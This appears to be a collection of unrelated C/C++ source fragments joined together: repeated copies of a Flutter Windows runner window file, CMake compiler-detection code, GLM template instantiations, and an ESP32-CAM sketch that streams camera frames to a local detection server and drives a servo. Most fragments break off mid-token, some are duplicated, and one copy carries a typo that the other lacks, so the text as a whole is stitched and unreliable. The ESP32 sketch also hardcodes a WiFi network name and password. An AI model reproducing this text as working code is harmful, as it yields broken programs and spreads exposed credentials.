Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/// @ref core\n/// @file glm/glm.cpp\n\n#ifndef GLM_ENABLE_EXPERIMENTAL\n#define GLM_ENABLE_EXPERIMENTAL\n#endif\n#include <glm/gtx/dual_quaternion.hpp>\n#include <glm/gtc/vec1.hpp>\n#include <glm/gtc/quaternion.hpp>\n#include <glm/ext/scalar_int_sized.hpp>\n#include <glm/ext/scalar_uint_sized.hpp>\n#include <glm/glm.hpp>\n\nnamespace glm\n{\n// tvec1 type explicit instantiation\ntemplate struct vec<1, uint8, lowp>;\ntemplate struct vec<1, uint16, lowp>;\ntemplate struct vec<1, uint32, lowp>;\ntemplate struct vec<1, uint64, lowp>;\ntemplate struct vec<1, int8, lowp>;\ntemplate struct vec<1, int16, lowp>;\ntemplate struct vec<1, int32, lowp>;\ntemplate struct vec<1, int64, lowp>;\ntemplate struct vec<1, float32, lowp>;\ntemplate struct vec<1, float64, lowp>;\n\ntemplate struct vec<1, uint8, mediump>;\ntemplate struct vec<1, uint16, mediump>;\ntemplate struct vec<1, uint32, mediump>;\ntemplate struct vec<1, uint64, mediump>;\ntemplate struct vec<1, int8, mediump>;\ntemplate struct vec<1, int16, mediump>;\ntemplate struct vec<1, int32, mediump>;\ntemplate struct vec<1, int64, mediump>;\ntemplate struct vec<1, float32, mediump>;\ntemplate struct vec<1, float64, mediump>;\n\ntemplate struct vec<1, uint8, highp>;\ntemplate struct vec<1, uint16, highp>;\ntemplate struct vec<1, uint32, highp>;\ntemplate struct vec<1, uint64, highp>;\ntemplate struct vec<1, int8, highp>;\ntemplate struct vec<1, int16, highp>;\ntemplate struct vec<1, int32, highp>;\ntemplate struct vec<1, int64, highp>;\ntemplate struct vec<1, float32, highp>;\ntemplate struct vec<1, float64, highp>;\n\n// tvec2 type explicit instantiation\ntemplate struct vec<2, uint8, lowp>;\ntemplate struct vec<2, uint16, lowp>;\ntemplate struct vec<2, uint32, lowp>;\ntemplate struct vec<2, uint64, lowp>;\ntemplate struct vec<2, int8, lowp>;\ntemplate struct vec<2, int16, lowp>;\ntemplate struct vec<2, int32, lowp>;\ntemplate struct vec<2, int64, lowp>;\ntemplate struct vec<2, float32, lowp>;\ntemplate struct vec<2, float64, lowp>;\n\ntemplate struct vec<2, uint8, mediump>;\ntemplate struct vec<2, uint16, mediump>;\ntemplate struct vec<2, uint32, mediump>;\ntemplate struct vec<2, uint64, mediump>;\ntemplate struct vec<2, int8, mediump>;\ntemplate struct vec<2, int16, mediump>;\ntemplate struct vec<2, int32, mediump>;\ntemplate struct vec<2, int64, mediump>;\ntemplate struct vec<2, float32, mediump>;\ntemplate struct vec<2, float64, mediump>;\n\ntemplate struct vec<2, uint8, highp>;\ntemplate struct vec<2, uint16, highp>;\ntemplate struct vec<2, uint32, highp>;\ntemplate struct vec<2, uint64, highp>;\ntemplate struct vec<2, int8, highp>;\ntemplate struct vec<2, int16, highp>;\ntemplate struct vec<2, int32, highp>;\ntemplate struct vec<2, int64, highp>;\ntemplate struct vec<2, float32, highp>;\ntemplate struct vec<2, float64, highp>;\n\n// tvec3 type explicit instantiation\ntemplate struct vec<3, uint8, lowp>;\ntemplate struct vec<3, uint16, lowp>;\ntemplate struct vec<3, uint32, lowp>;\ntemplate struct vec<3, uint64, lowp>;\ntemplate struct vec<3, int8, lowp>;\ntemplate struct vec<3, int16, lowp>;\ntemplate struct vec<3, int32, lowp>;\ntemplate struct vec<3, int64, lowp>;\ntemplate struct vec<3, float32, lowp>;\ntemplate struct vec<3, float64, lowp>;\n\ntemplate struct vec<3, uint8, mediump>;\ntemplate struct vec<3, uint16, mediump>;\ntemplate struct vec<3, uint32, mediump>;\ntemplate struct vec<3, uint64, mediump>;\ntemplate struct vec<3, int8, mediump>;\ntemplate struct vec<3, int16, mediump>;\ntemplate struct vec<3, int32, mediump>;\ntemplate struct vec<3, int64, mediump>;\ntemplate struct vec<3, float32, mediump>;\ntemplate struct vec<3, float64, mediump>;\n\ntemplate struct vec<3, uint8, highp>;\ntemplate struct vec<3, uint16, highp>;\ntemplate struct vec<3, uint32, highp>;\ntemplate struct vec<3, uint64, highp>;\ntemplate struct vec<3, int8, highp>;\ntemplate struct vec<3, int16, highp>;\ntemplate struct vec<3, int32, highp>;\ntemplate struct vec<3, int64, highp>;\ntemplate struct vec<3, float32, highp>;\ntemplate struct vec<3, float64, highp>;\n\n// tvec4 type explicit instantiation\ntemplate struct vec<4, uint8, lowp>;\ntemplate struct vec<4, uint16, lowp>;\ntemplate struct vec<4, uint32, lowp>;\ntemplate struct vec<4, uint64, lowp>;\ntemplate struct vec<4, int8, lowp>;\ntemplate struct vec<4, int16, lowp>;\ntemplate struct vec<4, int32, lowp>;\ntemplate struct vec<4, int64, lowp>;\ntemplate struct vec<4, float32, lowp>;\ntemplate struct vec<4, float64, lowp>;\n\ntemplate struct vec<4, uint8, mediump>;\ntemplate struct vec<4, uint16, mediump>;\ntemplate struct vec<4, uint32, mediump>;\ntemplate struct vec<4, uint64, mediump>;\ntemplate struct vec<4, int8, mediump>;\ntemplate struct vec<4, int16, mediump>;\ntemplate struct vec<4, int32, mediump>;\ntemplate struct vec<4, int64, mediump>;\ntemplate struct vec<4, float32, mediump>;\ntemplate struct vec<4, float64, mediump>;\n\ntemplate struct vec<4, uint8, highp>;\ntemplate struct vec<4, uint16, highp>;\ntemplate struct vec<4, uint32, highp>;\ntemplate struct vec<4, uint64, highp>;\ntemplate struct vec<4, int8, highp>;\ntemplate struct vec<4, int16, hig",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a versio is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ = VVRP + 1100 */\n# define COMPILER_VERSION_MAJOR DEC((__WATCOMC__ - 1100) / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCO",
    "#include <eloquent_esp32cam.h>\n#include <WiFi.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <vector>\n#include <ESP32Servo.h>\n// #include <cstring>\n\n\n#define WIFI_SSID \"Backbone\"\n#define WIFI_PASSWORD \"GMUBackbone@123\"\n#define HOSTNAME  \"esp32cam\"\n\n\n#define HOST \"192.168.1.127\"\n#define PORT 4000\n#define MOTOR 12\n\n\nWiFiClient client;\n\nServo myservo;\nint x_1, y_1, x_2, y_2;\nvoid setup() {\n  // put your setup code here, to run once:\n    delay(3000);\n    Serial.begin(115200);\n    Serial.println(\"___Camera Streamer___\");\n    myservo.attach(MOTOR, 1000, 2000);\n    myservo.setPeriodHertz(50);\n    // camera settings\n    // replace with your own model!\n    eloq::camera.pinout.aithinker();\n    eloq::camera.brownout.disable();\n    // Edge Impulse models work on square images\n    // face resolution is 240x240\n    eloq::camera.resolution.face();\n    eloq::camera.quality.high();\n\n    // init camera\n    while (!eloq::camera.begin().isOk())\n        Serial.println(eloq::camera.exception.toString());\n\n    // connect to WiFi\n        WiFi.begin(WIFI_SSID, WIFI_PASSWORD);\n\n    while (WiFi.status() != WL_CONNECTED) {\n        delay(500);\n        Serial.print(\".\");\n    }\n\n  \n  if(!client.connect(HOST, PORT)){\n    return;\n  }\n}\n\nString objDetect(){\n    \n    if (!eloq::camera.capture().isOk()) {\n        Serial.println(eloq::camera.exception.toString());\n        return \"\";\n    }\n    client.print(eloq::camera.frame->len);\n    client.write((const char *) eloq::camera.frame->buf, eloq::camera.frame->len);\n    client.flush();\n    x_1 = client.readStringUntil(',').toInt();\n    y_1 = client.readStringUntil(',').toInt();\n    x_2 = client.readStringUntil(',').toInt();\n    y_2 = client.readStringUntil(',').toInt();\n    String str = client.readStringUntil('#');\n    return \"\";\n}\n\nvoid loop() {\n  // put your main code here, to run repeatedly:\n\n    if(!client.connected()){\n      if(!client.connect(HOST, PORT)){\n        Serial.printf(\".\");\n        return;\n      }    \n      delay(500);\n    }\n  \n  String detection = objDetect();\n  if (detection.length() > 0){\n    \n    Serial.printf(\"x1:%d, y1:%d, x2:%d, y2:%d\", x_1, y_1, x_2, y_2);\n    \n  }\n\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  